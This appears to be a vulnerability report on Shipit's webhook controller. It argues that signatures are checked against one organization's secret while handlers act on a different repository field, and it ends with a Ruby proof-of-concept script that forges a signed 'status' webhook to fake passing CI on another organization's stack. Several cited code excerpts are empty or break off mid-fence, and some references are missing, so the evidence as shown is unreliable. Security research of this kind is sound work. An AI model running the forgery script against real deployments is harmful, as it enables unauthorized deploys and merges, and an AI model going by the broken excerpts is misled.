### Title
Webhook signature is verified against `repository.owner.login`, but every event handler dispatches on the unrelated `repository.full_name` field, letting one authenticated GitHub organization forge state changes for any other organization's stacks - (File: app/controllers/shipit/webhooks_controller.rb)

### Summary
`WebhooksController#verify_signature` selects which GitHub App's `webhook_secret` to HMAC-verify a request against using `repository_owner`, derived from `params.dig('repository', 'owner', 'login')`. However, once the signature check passes, every registered handler (`PushHandler`, `StatusHandler`, `MembershipHandler`, all `PullRequest::*Handler`s) resolves the target `Repository`/`Stack` using a completely different, uncorrelated field of the same payload: `repository.full_name` (via `Handler#repository_name` and `Repository.from_github_repo_name`). Nothing binds these two fields together, so a payload signed correctly for organization A's webhook secret can carry a `repository.full_name` pointing at organization B's stack.

### Finding Description
`verify_signature` in `app/controllers/shipit/webhooks_controller.rb:24-49` does:
```ruby
def verify_signature
  github_app = Shipit.github(organization: repository_owner)
  verified = github_app.verify_webhook_signature(
    request.headers['X-Hub-Signature'],
    request.raw_post
  )
  ...
end

def repository_owner
  params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
end
``` [1](#0-0) 

This only proves the raw body was HMAC-signed with the secret belonging to whichever organization's login appears at `repository.owner.login`. It does not prove any relationship between that organization and the `repository.full_name` value used everywhere else in the pipeline.

All webhook handlers inherit `repository_name`/`stacks` from the base `Handler` class:
```ruby
def stacks

end

def repository_name

end
``` [2](#0-1) 

`Repository.from_github_repo_name` looks up any repository in the entire installation by owner/name parsed out of `full_name`, with no scoping to the organization used for signature verification:
```ruby

`Shipit.github(organization:)` supports exactly this multi-organization setup, where each org has its own independent `webhook_secret`:
```ruby
def github(organization: github_default_organization)
  if github_default_organization.nil?
    config = secrets.github
  else
    config = github_app_config(organization)
    raise GithubOrganizationUnknown, organization if config.nil?
  end
  @github ||= {}
  @github[organization] ||= GitHubApp.new(organization, config)
end
``` [6](#0-5) 

This is exactly the equality that the engine relies on, but never enforces:
`organization authenticated by signature (repository.owner.login)` == `organization that owns the repository actually written to (repository.full_name)`.

**Before the attack:** the two fields always agree because they both originate from GitHub's own webhook delivery for a single real repository.
**After the attack:** an entity that controls the GitHub App installation (and therefore knows the `webhook_secret`) for *any one* configured organization (e.g., "OrgA") can compute a valid `X-Hub-Signature` over an arbitrary JSON body, set `repository.owner.login = "OrgA"` (so `verify_signature` picks OrgA's secret and passes), and set `repository.full_name = "OrgB/some-repo"` for a target repository belonging to a completely different, unrelated organization hosted on the same Shipit instance. The webhook is accepted and dispatched to handlers that operate solely on `full_name`, letting the attacker act on OrgB's stacks without ever holding OrgB's secret.

### Impact Explanation
Depending on the event forged, this reaches the engine's "High"/"Critical" impact categories:
- A forged `status` event lets the attacker attach a fabricated `success` commit status to an arbitrary sha on OrgB's tracked repository (`StatusHandler#process`), which can satisfy `required_statuses`/CI gating for OrgB's merge queue and deploy pipeline (`app/models/shipit/deploy_spec.rb` `required_statuses`, `merge_request_required_statuses`), enabling an **unauthorized deploy or merge** on a stack the attacker has no legitimate access to.
- A forged `push` event triggers `stack.sync_github` for OrgB's stacks, and a forged `membership` event can create/modify `Team`/`Membership`/`User` records tied to OrgB's authorization teams (`Shipit.github_teams`), i.e. **escalation into `Shipit.github_teams` authorization**.
- This requires only that the attacker legitimately control (or have social/insider access to) the webhook secret of any one organization configured in the same Shipit instance — a materially lower bar than compromising OrgB directly, and it is not mitigated by anything in the current code path since `repository_owner` and `repository_name`/`full_name` are never cross-checked.

### Likelihood Explanation
Any Shipit deployment that follows the documented multi-organization configuration (`config/secrets.development.shopify.yml`, `docs/setup.md` "multiple GitHub applications" schema) is affected. An attacker only needs webhook-secret-level knowledge of a single configured organization — which could be a lower-trust org intentionally onboarded with fewer privileges — to target any other org's stacks. No GitHub App installation on the target org, no Shipit session, and no `ApiClient` token are required; only the ability to POST a crafted, self-signed payload to `/webhooks`.

### Recommendation
In `WebhooksController#verify_signature` (or in the base `Handler`), enforce that the organization whose secret verified the signature matches the owner segment of `repository.full_name` (and of `organization.login` for org-level events) before any handler is invoked, e.g.:
```ruby
def verify_signature
  github_app = Shipit.github(organization: repository_owner)
  verified = github_app.verify_webhook_signature(request.headers['X-Hub-Signature'], request.raw_post)
  head(422) and return unless verified

  full_name_owner = params.dig('repository', 'full_name')&.split('/')&.first
  if full_name_owner && full_name_owner.casecmp(repository_owner).nonzero?
    head(422)
  end
end
```
More generally, `Handler#repository_name`/`stacks` should be scoped by the verified organization rather than trusting `repository.full_name` in isolation.

### Proof of Concept
Given a Shipit instance configured with two organizations, `OrgA` (attacker-controlled installation, secret `S_A`) and `OrgB` (victim, unrelated secret), with a stack tracking `OrgB/target-repo` on branch `main` requiring a `ci/tests` status:

```ruby
require 'openssl'
require 'net/http'
require 'json'

payload = {
  sha: "<sha_the_attacker_wants_to_deploy>",
  state: "success",
  context: "ci/tests",
  description: "forged",
  repository: {
    owner: { login: "OrgA" },   # used only for signature-secret selection
    full_name: "OrgB/target-repo" # used by StatusHandler to pick the target commit/stack
  }
}.to_json

signature = "sha1=" + OpenSSL::HMAC.hexdigest("sha1", "S_A", payload)

uri = URI("https://shipit.example.com/webhooks")
req = Net::HTTP::Post.new(uri, {
  "Content-Type" => "application/json",
  "X-Github-Event" => "status",
  "X-Hub-Signature" => signature
})
req.body = payload
Net::HTTP.start(uri.host, uri.port, use_ssl: true) { |http| http.request(req) }
# verify_signature succeeds (secret matches OrgA), but StatusHandler writes
# a fabricated "success" status onto OrgB's commit, satisfying required CI checks.
```

Note: I could not verify at the code level whether any additional layer (e.g. a reverse proxy or GitHub App webhook routing) exists in a specific deployment that might further restrict which `X-Hub-Signature`/organization combination reaches this endpoint; the analysis above is based solely on the engine code paths cited (`app/controllers/shipit/webhooks_controller.rb`, `app/models/shipit/webhooks/handlers/handler.rb`, `app/models/shipit/repository.rb`, `lib/shipit.rb`).
